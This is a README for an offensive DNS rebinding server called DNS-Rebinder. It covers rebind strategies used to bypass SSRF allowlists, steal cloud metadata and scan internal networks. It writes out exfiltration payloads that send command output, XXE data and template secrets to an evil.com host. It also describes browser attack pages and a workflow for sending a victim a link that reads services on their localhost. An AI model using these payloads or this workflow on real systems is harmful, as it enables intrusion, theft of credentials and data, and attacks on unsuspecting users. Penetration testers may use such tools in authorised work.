# DNS-Rebinder

DNS rebinding attack server with interactive control, multiple strategies, and data exfiltration capture.

Based on [cujanovic's dns.py](https://github.com/cujanovic/SSRF-Testing/blob/master/dns.py).

## Features

- **Multiple rebind strategies** — count, time-based, round-robin, random, multi-target
- **Live control** — Change IPs, strategies on the fly without restart
- **Subdomain exfiltration** — Capture data encoded in DNS queries
- **Structured logging** — Human-readable + JSON logs

## Installation

```bash
pip install twisted
```

## Quick Start

### Interactive wizard (recommended for first use)
```bash
sudo python3 dns-rebinder.py
```

### Command line
```bash
sudo python3 dns-rebinder.py \
    -w 8.8.8.8 \
    -r 127.0.0.1 \
    -s YOUR_SERVER_IP \
    -d evil.com
```

### Test it
```bash
dig test.evil.com @YOUR_SERVER_IP   # Returns 8.8.8.8
dig test.evil.com @YOUR_SERVER_IP   # Returns 127.0.0.1 (rebound!)
```

---

## Rebind Strategies

### Count (default)
Rebind after N queries to the same hostname.

```bash
# Rebind on 2nd query (default)
--strategy count 1

# Rebind on 3rd query (survive 2 validation checks)
--strategy count 2
```

```
Query 1 → 8.8.8.8 (whitelist)
Query 2 → 127.0.0.1 (REBIND)
Query 3 → 127.0.0.1
```

**Use when:** Most SSRF scenarios. App resolves once to validate, again to connect.

---

### Time
Rebind after N seconds from first query to that hostname.

```bash
# Rebind after 5 seconds
--strategy time 5
```

```
0-5 seconds  → 8.8.8.8 (whitelist)
5+ seconds   → 127.0.0.1 (REBIND)
```

**Use when:** App makes multiple rapid queries during validation, but delays before actual request. You want all validation queries to pass.

---

### Round-Robin
Alternate between whitelist and rebind on every query.

```bash
--strategy round-robin
```

```
Query 1 → 8.8.8.8
Query 2 → 127.0.0.1
Query 3 → 8.8.8.8
Query 4 → 127.0.0.1
```

**Use when:** Race conditions or TOCTOU attacks. Increases odds of hitting the right timing window.

---

### Random
Probabilistic rebinding (first query always returns whitelist).

```bash
# 50% rebind probability (default)
--strategy random 0.5

# 30% rebind probability
--strategy random 0.3
```

```
Query 1 → 8.8.8.8 (always whitelist)
Query 2 → 50% chance of either
Query 3 → 50% chance of either
```

**Use when:** Unknown app behavior, spray-and-pray approach, or bypassing caching layers that batch queries.

---

### Multi-Target
Cycle through multiple rebind IPs. Great for internal network scanning via SSRF.

```bash
# Cycle through internal IPs after 1 whitelist query
--strategy multi-target 1 -r 127.0.0.1,169.254.169.254,10.0.0.1,192.168.1.1
```

```
Query 1 → 8.8.8.8 (whitelist)
Query 2 → 127.0.0.1
Query 3 → 169.254.169.254
Query 4 → 10.0.0.1
Query 5 → 192.168.1.1
Query 6 → 127.0.0.1 (cycles)
```

**Use when:** Scanning internal network through an SSRF. Each query probes a different internal target.

---

## Subdomain Data Exfiltration

Capture data encoded in DNS queries. Useful for:
- Blind command injection: `$(whoami).exfil.evil.com`
- Data exfiltration: `secret-token.exfil.evil.com`
- Out-of-band testing: Confirm code execution paths

### How it works

Any query matching `*.EXFIL_PREFIX.DOMAIN` is logged specially:

```bash
# Server configured with: -d evil.com --exfil-prefix exfil
dig admin-user.exfil.evil.com @YOUR_SERVER
```

Output:
```
[12:34:56.789] EXFIL admin-user
             from admin-user.exfil.evil.com (1.2.3.4)
```

### Payload examples

**Blind command injection:**
```bash
# Linux
curl "http://target/vuln?cmd=$(whoami).exfil.evil.com"

# Alternative using nslookup
curl "http://target/vuln?cmd=nslookup+$(id|base64).exfil.evil.com"
```

**XXE exfil:**
```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://secret-data.exfil.evil.com/x">
]>
<foo>&xxe;</foo>
```

**SSTI:**
```
{{config.SECRET_KEY}}.exfil.evil.com
```

### Logs

Exfiltrated data is saved to:
- `dns-exfil-TIMESTAMP.log` — Dedicated exfil log
- `dns-rebind-TIMESTAMP.json` — Full JSON log with all events

---

## Interactive Commands

While running, type commands at the prompt:

| Command | Description |
|---------|-------------|
| `status` | Show config, stats, log paths |
| `set whitelist <ip>` | Change whitelist IP |
| `set rebind <ip>[,ip2,...]` | Change rebind IPs |
| `set strategy <name> [opts]` | Change strategy live |
| `set exfil <prefix>` | Change exfil subdomain prefix |
| `reset [hostname]` | Reset query state |
| `hosts` | List all tracked hostnames |
| `log [n]` | Show last N queries |
| `exfil` | Show exfil summary and usage |
| `help` | Show all commands |
| `quit` | Stop server |

### Examples

```
> set rebind 169.254.169.254
Rebind IPs: ['127.0.0.1'] -> ['169.254.169.254']

> set strategy time 3
Strategy: count (rebind after 1 queries) -> time (rebind after 3.0s)

> set rebind 10.0.0.1,10.0.0.2,10.0.0.3
> set strategy multi-target 1
# Now cycling through internal IPs

> hosts
Tracked hosts (3):
──────────────────────────────────────────────────────────────────────
  Hostname                                  Queries     Last Response
──────────────────────────────────────────────────────────────────────
  test.evil.com                                   5    127.0.0.1 (REBIND)
  api.evil.com                                    2    8.8.8.8 (whitelist)
```

---

## Logging

Three log files are created per session:

| File | Contents |
|------|----------|
| `dns-rebind-TIMESTAMP.log` | Human-readable query log |
| `dns-rebind-TIMESTAMP.json` | Structured JSON (for parsing) |
| `dns-exfil-TIMESTAMP.log` | Exfiltrated data only |

### JSON log format

```json
[
  {
    "timestamp": "2024-01-15T12:34:56.789",
    "type": "query",
    "query_type": "A",
    "hostname": "test.evil.com",
    "response_ip": "127.0.0.1",
    "source_ip": "1.2.3.4",
    "source_port": 54321,
    "is_rebind": true,
    "query_count": 2,
    "strategy": "count (rebind after 1 queries)"
  },
  {
    "timestamp": "2024-01-15T12:35:00.123",
    "type": "exfil",
    "hostname": "secret-data.exfil.evil.com",
    "data": "secret-data",
    "source_ip": "1.2.3.4"
  }
]
```

---

## Browser Attack Payloads

The built-in HTTP server (port 8080 by default) serves ready-to-use attack payloads.

### How browser DNS rebinding works

1. Victim visits `http://attack.evil.com:8080/single?port=3000`
2. DNS resolves to YOUR server → serves the attack page
3. JavaScript waits for DNS TTL to expire
4. JS fetches "same origin" → DNS now returns rebind IP (127.0.0.1)
5. Browser thinks it's same origin, so JS can READ the response!
6. Data exfiltrated via DNS queries to your exfil domain

### Available Payloads

Access the payload index at `http://YOUR_SERVER:8080/`

#### `/single` — Single Target Attack
Steal response from one target.

```
http://attack.evil.com:8080/single?port=3000&path=/admin
```

Parameters:
- `port` — Target port (default: 80)
- `path` — Path to fetch (default: /)
- `delay` — Ms to wait for TTL (default: 3000)

**Use case:** Steal data from localhost:3000/admin on victim's machine

---

#### `/portscan` — Port Scanner
Scan ports on victim's localhost.

```
http://attack.evil.com:8080/portscan?ports=22,80,443,3000,5000,8080
```

Parameters:
- `ports` — Comma-separated port list
- `delay` — Ms to wait for TTL (default: 3000)

**Use case:** Discover what services victim is running locally

---

#### `/netscan` — Network Scanner
Scan victim's internal network. Use with `--strategy multi-target`.

```bash
# Server setup
sudo python3 dns-rebinder.py \
    -w 8.8.8.8 \
    -r 192.168.1.1,192.168.1.2,192.168.1.3,192.168.1.4,192.168.1.5 \
    --strategy multi-target 1 \
    -s YOUR_IP -d evil.com

# Attack URL
http://attack.evil.com:8080/netscan?port=80
```

Parameters:
- `port` — Port to scan (default: 80)
- `delay` — Ms to wait for TTL (default: 3000)

**Use case:** Find web servers on victim's LAN

---

### Attack Workflow

1. **Start dns-rebinder:**
   ```bash
   sudo python3 dns-rebinder.py -w 8.8.8.8 -r 127.0.0.1 -s YOUR_IP -d evil.com
   ```

2. **Send victim the attack URL:**
   ```
   http://attack.evil.com:8080/single?port=3000&path=/api/secrets
   ```

3. **Victim opens link in browser:**
   - Page loads from YOUR server
   - Waits 3 seconds
   - Fetches from "attack.evil.com:3000" → now resolves to 127.0.0.1
   - JS reads response from victim's localhost:3000!

4. **Data exfiltrates via DNS:**
   ```
   [EXFIL] eyJzZWNyZXQiOiJwYXNzd29yZDEyMyJ9...
        from YWRtaW4tc2VjcmV0.exfil.evil.com
   ```

### Exfiltration

Stolen data is automatically exfiltrated via DNS queries:
- Data is base64-encoded and sent as subdomain
- Captured by your exfil log
- Works even if victim blocks HTTP callbacks!

### Interactive Commands

While server is running:
```
> payload
```
Shows all payload URLs and usage instructions.

---

## DNS Setup

For this to work, you need NS records pointing to your server.

### Example (evil.com)

```
; DNS records for evil.com
@       IN  A       YOUR_SERVER_IP
@       IN  NS      ns1.evil.com.
@       IN  NS      ns2.evil.com.
ns1     IN  A       YOUR_SERVER_IP
ns2     IN  A       YOUR_SERVER_IP
*       IN  A       YOUR_SERVER_IP
```

Or use a subdomain:
```
; rebind.evil.com handled by your server
rebind  IN  NS      ns1.rebind.evil.com.
ns1.rebind IN A     YOUR_SERVER_IP
```

---

## Command Line Reference

```
usage: dns-rebinder.py [-h] [--whitelist IP] [--rebind IPS] [--server IP]
                       [--port PORT] [--domain DOMAIN] 
                       [--strategy NAME [OPTS]] [--exfil-prefix PREFIX]
                       [--http-port PORT]

Options:
  -w, --whitelist IP          IP that passes target's allowlist
  -r, --rebind IPS            Rebind IP(s), comma-separated
  -s, --server IP             Your server's public IP
  -p, --port PORT             DNS port (default: 53)
  -d, --domain DOMAIN         Your domain
  --strategy NAME [OPTS]      Rebind strategy (see above)
  --exfil-prefix PREFIX       Exfil subdomain prefix (default: exfil)
  --http-port PORT            HTTP payload server port (default: 8080)
  --ttl TTL                   DNS TTL (default: 0)
```

---

## Examples

### Basic SSRF bypass
```bash
sudo python3 dns-rebinder.py -w 8.8.8.8 -r 127.0.0.1 -s 1.2.3.4 -d evil.com
```

### Cloud metadata theft
```bash
sudo python3 dns-rebinder.py -w 8.8.8.8 -r 169.254.169.254 -s 1.2.3.4 -d evil.com
```

### Internal network scan
```bash
sudo python3 dns-rebinder.py \
    -w 8.8.8.8 \
    -r 10.0.0.1,10.0.0.2,10.0.0.3,10.0.0.4,10.0.0.5 \
    -s 1.2.3.4 \
    -d evil.com \
    --strategy multi-target 1
```

### Time-based (survive multiple validations)
```bash
sudo python3 dns-rebinder.py \
    -w 8.8.8.8 \
    -r 127.0.0.1 \
    -s 1.2.3.4 \
    -d evil.com \
    --strategy time 5
```

---

## License

MIT
